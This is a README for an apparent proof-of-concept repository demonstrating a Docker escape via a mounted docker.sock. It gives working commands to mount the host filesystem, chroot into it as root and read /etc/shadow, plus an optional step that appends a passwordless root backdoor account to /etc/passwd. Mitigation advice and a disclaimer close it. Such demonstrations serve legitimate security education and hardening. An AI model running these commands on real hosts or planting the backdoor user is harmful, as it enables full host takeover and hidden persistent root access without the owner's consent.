# 🐳 Docker.sock Breakout PoC

> 🚨 A proof-of-concept showing how mounting `/var/run/docker.sock` into a container gives root access to the host.

This project demonstrates a **critical Docker misconfiguration**. By mounting the Docker Unix socket into a container, the container can communicate with the host Docker daemon — and effectively escape its sandbox, escalate privileges, and fully control the host.

## ⚠️ TL;DR

Mounting `/var/run/docker.sock` gives the container **root-level access to the host**.

## 📁 Project Structure

```
docker-sock-poc/
├── Dockerfile
├── docker-compose.yml
└── exploit.sh
```

## 🧪 How It Works

1. A container is started with `-v /var/run/docker.sock:/var/run/docker.sock`
2. Inside the container, Docker CLI is available
3. We use Docker inside the container to run **another** container
4. That second container mounts `/` from the host and runs `chroot /host`
5. Now we’re inside the host, as root

## 🚀 Quick Start

### 1. Build and Run

```bash
git clone git@github.com:CyberSquirrel-AI/docker-sock-breakout.git
cd docker-sock-poc

docker-compose up -d
docker exec -it docker-sock-breakout sh
```

### 2. Inside the Container

```bash
docker ps
docker run -it --rm -v /:/host alpine
```

### 3. Inside the Alpine container

```bash
chroot /host
hostname
id
ls /root
cat /etc/shadow
```

## 🕵️ Optional: Add a Backdoor User

```bash
echo 'hacker::0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```

## 📉 Impact

- Full host filesystem access
- Run arbitrary containers as `--privileged`
- Read sensitive files like `/etc/shadow`, `/root/.ssh/`
- Install rootkits or persist on host
- Pivot to other containers, networks, volumes

## 🛡️ Mitigation

- ❌ Do NOT mount `/var/run/docker.sock` into untrusted containers
- ✅ Use alternatives like:
  - Kaniko
  - BuildKit
- ✅ Use rootless Docker
- ✅ Enforce security policies with AppArmor, SELinux, seccomp
- ✅ Audit Docker usage with tools like Falco, AuditD

## 🧠 Author

**@yourname**  
Security Researcher | DevSecOps | Threat Hunter

## ⚠️ Disclaimer

This project is for **educational purposes only**. Do not run this on any system you don't own or have permission to test. You are responsible for your actions.
